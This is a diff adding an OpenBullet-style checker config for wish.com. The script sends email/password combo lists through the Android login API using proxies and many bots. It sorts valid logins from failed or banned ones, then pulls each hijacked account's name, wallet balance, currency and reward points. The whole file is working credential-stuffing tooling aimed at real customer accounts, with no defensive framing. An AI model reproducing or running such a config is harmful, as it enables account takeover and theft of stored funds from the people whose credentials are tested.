@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "wish.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-30T14:02:19.4257976+03:30",
+  "AdditionalInfo": "",
+  "Author": "TEZARX_X",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomGUID -> VAR "sessionto" 
+
+FUNCTION RandomGUID -> VAR "sessionto1" 
+
+FUNCTION RandomGUID -> VAR "sessionto2" 
+
+REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "email=<USER>&password=<PASS>&session_refresh=false&app_referrer=utm_source%3Dgoogle-play%26utm_medium%3Dorganic&app_referrer_click_ts=0&app_referrer_install_ts=1600098667&app_device_id=f4b755ca-8812-38a2-a441-555e55176f61&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C151%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C183%2C184%2C185%2C186%2C189%2C190%2C191%2C192%2C193%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C212%2C214%2C215%2C216%2C217%2C218%2C219%2C221%2C224%2C225%2C226%2C227%2C229%2C230%2C231%2C232%2C234%2C235%2C236%2C237%2C238%2C240%2C245%2C246%2C247%2C248%2C249%2C251%2C252%2C253%2C254%2C256%2C258%2C259%2C261%2C262%2C264%2C265%2C270&_app_type=wish&securedtouch_token=&_riskified_session_token=<sessionto>&_threat_metrix_session_token=<sessionto1>&advertiser_id=<sessionto2>&firebase_app_instance_id=e9828fac66e0af69cdf5fbeaffee5a7b&_version=4.41.7&app_device_model=SM-G930K" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1510" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Cookie: _xsrf=1; _appLocale=en_IR; _timezone=4.5; _timezone_id=Asia/Tehran; _securedtouch_token=" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "msg\": \"\", " 
+  KEYCHAIN Failure OR 
+    KEY "Email or Password is incorrect" 
+    KEY "Please connect using Facebook to login to this account" 
+    KEY "To access your account, you will need to reset your password. We have sent a password reset email " 
+  KEYCHAIN Ban OR 
+    KEY "msg\": \"Required Param 'email' Missing\", " 
+    KEY "Trend Micro InterScan Web Security Event" 
+
+PARSE "<SOURCE>" LR "\"user\": \"" "\"," -> VAR "user" 
+
+PARSE "<COOKIES(vendor_user_tracker)>" LR "" "" -> VAR "vendor_user_tracker" 
+
+PARSE "<COOKIES(sweeper_session)>" LR "" "" -> VAR "sweeper_session" 
+
+PARSE "<COOKIES(bsid)>" LR "" "" -> VAR "bsid" 
+
+REQUEST POST "https://www.wish.com/api/profile/get" 
+  CONTENT "uid=<user>&show_friend_js_link=true&image_size=medium&preview_size=4&supports_bucket_management=true&app_device_id=f4b755ca-8812-38a2-a441-555e55176f61&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C151%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C183%2C184%2C185%2C186%2C189%2C190%2C191%2C192%2C193%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C212%2C214%2C215%2C216%2C217%2C218%2C219%2C221%2C224%2C225%2C226%2C227%2C229%2C230%2C231%2C232%2C234%2C235%2C236%2C237%2C238%2C240%2C245%2C246%2C247%2C248%2C249%2C251%2C252%2C253%2C254%2C256%2C258%2C259%2C261%2C262%2C264%2C265%2C270&_app_type=wish&securedtouch_token=&_riskified_session_token=<sessionto>&_threat_metrix_session_token=<sessionto1>&advertiser_id=<sessionto2>&firebase_app_instance_id=e9828fac66e0af69cdf5fbeaffee5a7b&_version=4.41.7&app_device_model=SM-G930K" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1510" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Cookie: _xsrf=1; _appLocale=en_IR; _timezone=4.5; _timezone_id=Asia/Tehran; _securedtouch_token=" 
+
+PARSE "<SOURCE>" LR "\"signup_date\": " "\"is_wish_employee\": false" -> VAR "name1" 
+
+PARSE "<name1>" LR "\"name\": \"" "\"," -> CAP "name" 
+
+REQUEST POST "https://www.wish.com/api/user/status" 
+  CONTENT "supports_mobile_action_dict=true&shipping_location_data=true&app_device_id=f4b755ca-8812-38a2-a441-555e55176f61&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C151%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C183%2C184%2C185%2C186%2C189%2C190%2C191%2C192%2C193%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C212%2C214%2C215%2C216%2C217%2C218%2C219%2C221%2C224%2C225%2C226%2C227%2C229%2C230%2C231%2C232%2C234%2C235%2C236%2C237%2C238%2C240%2C245%2C246%2C247%2C248%2C249%2C251%2C252%2C253%2C254%2C256%2C258%2C259%2C261%2C262%2C264%2C265%2C270&_app_type=wish&securedtouch_token=&_riskified_session_token=52767d1a-da5f-4a25-94ad-957303293020&_threat_metrix_session_token=7625-1cc091b8-8f23-48e5-8aa8-0f6837df6272&advertiser_id=d953597d-249b-43ff-890d-1f01125ad1d5&firebase_app_instance_id=e9828fac66e0af69cdf5fbeaffee5a7b&_version=4.41.7&app_device_model=SM-G930K" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1370" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Cookie: _xsrf=1; _appLocale=en_IR; bsid=<bsid>; sweeper_session=<sweeper_session>; vendor_user_tracker=<vendor_user_tracker>; _timezone=4.5; _timezone_id=Asia/Tehran; _securedtouch_token=" 
+
+PARSE "<SOURCE>" JSON "localized_value" -> CAP "wallet" 
+
+PARSE "<SOURCE>" JSON "currency_code" -> CAP "money unit" 
+
+PARSE "<SOURCE>" JSON "user_reward_points" -> CAP "points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<wallet>" EqualTo "0" 
+
